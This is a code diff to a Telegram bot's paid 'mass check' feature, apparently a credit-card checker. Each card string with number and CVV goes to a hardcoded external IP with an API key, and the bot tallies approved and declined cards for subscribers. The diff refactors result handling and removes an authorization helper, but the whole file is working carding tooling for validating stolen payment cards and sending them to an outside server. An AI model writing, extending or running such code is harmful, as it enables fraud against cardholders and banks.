@@ -1147,8 +1147,8 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-import asyncio
 import time
+import asyncio
 import aiohttp
 import re
 from telegram import Update
@@ -1156,17 +1156,11 @@ from telegram.constants import ParseMode
 from telegram.helpers import escape_markdown
 from telegram.ext import ContextTypes
 
-from db import get_user, update_user  # your DB functions here
+# Import your database functions here
+from db import get_user, update_user
 
 OWNER_ID = 8438505794  # Replace with your Telegram user ID
-
 user_cooldowns = {}
-
-async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    # Only allow OWNER_ID in private chats
-    if update.effective_chat.type == "private":
-        return update.effective_user.id == OWNER_ID
-    return True
 
 async def enforce_cooldown(user_id: int, update: Update) -> bool:
     cooldown = 5  # seconds
@@ -1204,7 +1198,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
 
         parts = raw.split("|")
         if len(parts) != 4:
-            results.append(f"❌ Invalid card format: `{escape_markdown(raw, version=2)}`")
+            results.append(f"❌ Invalid card format: {escape_markdown(raw, version=2)}")
             error_count += 1
             continue
 
@@ -1214,11 +1208,11 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
         cc_normalized = "|".join(parts)
 
         if not await consume_credit(user_id):
-            results.append(f"❌ Failed to deduct credit for card `{escape_markdown(raw, version=2)}`.")
+            results.append(f"❌ Failed to deduct credit for card {escape_markdown(raw, version=2)}.")
             error_count += 1
             break
 
-        # New API URL
+        # ===== Updated API URL =====
         api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
 
         try:
@@ -1227,55 +1221,46 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                     if resp.status != 200:
                         raise Exception(f"HTTP {resp.status}")
                     data = await resp.json()
-
-            # Parse API response inside the try block
-            api_status = (data.get("status") or "Unknown").title()
-            api_response = data.get("response") or "N/A"
-
-            # Determine emoji based on status
-            emoji = "❓"
-            if api_status.lower() == "approved":
-                approved_count += 1
-                emoji = "✅"
-            elif api_status.lower() == "declined":
-                declined_count += 1
-                emoji = "❌"
-            else:
-                error_count += 1
-
-            checked_count += 1
-
-            # Prepare card result
-            card_result = (
-                f"`{escape_markdown(cc_normalized, version=2)}`\n"
-                f"𝐒𝐭𝐚𝐭𝐮𝐬➳ {emoji} {escape_markdown(api_response, version=2)}"
-            )
-            results.append(card_result)
-
         except Exception as e:
-            results.append(
-                f"❌ API Error for card `{escape_markdown(raw, version=2)}`: "
-                f"{escape_markdown(str(e), version=2)}"
-            )
+            results.append(f"❌ API Error for card {escape_markdown(raw, version=2)}: {escape_markdown(str(e), version=2)}")
             error_count += 1
             checked_count += 1
             continue
 
-        # Update processing message (optional live update)
+        api_status = (data.get("status") or "Unknown").title()
+        api_response = data.get("response") or "N/A"
+
+        emoji = "❓"
+        if api_status.lower() == "approved":
+            approved_count += 1
+            emoji = "✅"
+        elif api_status.lower() == "declined":
+            declined_count += 1
+            emoji = "❌"
+        else:
+            error_count += 1
+        checked_count += 1
+
+        card_result = (
+            f"{escape_markdown(cc_normalized, version=2)}\n"
+            f"𝐒𝐭𝐚𝐭𝐮𝐬➳ {emoji} {escape_markdown(api_response, version=2)}"
+        )
+        results.append(card_result)
+
+        current_time_taken = round(time.time() - start_time, 2)
+        current_summary = (
+            f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
+            f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
+            f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
+            f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
+            f"✘ 𝐄𝐫𝐫𝐨𝐫𝐬↣{error_count}\n"
+            f"✘ 𝐓𝐢𝐦𝐞↣{current_time_taken} 𝐒\n"
+            f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
+            f"──────── ⸙ ─────────"
+        )
         try:
-            current_time_taken = round(time.time() - start_time, 2)
-            current_summary = (
-                f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
-                f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
-                f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
-                f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
-                f"✘ 𝐄𝐫𝐫𝐨𝐫𝐬↣{error_count}\n"
-                f"✘ 𝐓𝐢𝐦𝐞↣{current_time_taken} 𝐒\n"
-                f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
-                f"────────✘────────"
-            )
             await processing_msg.edit_text(
-                escape_markdown(current_summary, version=2) + "\n\n" + "\n────────✘────────\n".join(results),
+                escape_markdown(current_summary, version=2) + "\n\n" + "\n──────── ⸙ ─────────\n".join(results),
                 parse_mode=ParseMode.MARKDOWN_V2
             )
         except Exception:
@@ -1290,10 +1275,10 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
         f"✘ 𝐄𝐫𝐫𝐨𝐫𝐬↣{error_count}\n"
         f"✘ 𝐓𝐢𝐦𝐞↣{final_time_taken} 𝐒\n"
         f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
-        f"────────✘────────"
+        f"──────── ⸙ ─────────"
     )
     await processing_msg.edit_text(
-        escape_markdown(final_summary, version=2) + "\n\n" + "\n────────✘────────\n".join(results) + "\n────────✘────────",
+        escape_markdown(final_summary, version=2) + "\n\n" + "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────",
         parse_mode=ParseMode.MARKDOWN_V2
     )
 
@@ -1301,7 +1286,7 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Private chat: only OWNER_ID allowed
     if update.effective_chat.type == "private" and update.effective_user.id != OWNER_ID:
         await update.effective_message.reply_text(
-            "❌ Private access is blocked.\nContact @K4linuxx to buy subscription.",
+            "❌ Private access is blocked.\nContact @YourOwnerUsername to buy subscription.",
             parse_mode=None
         )
         return
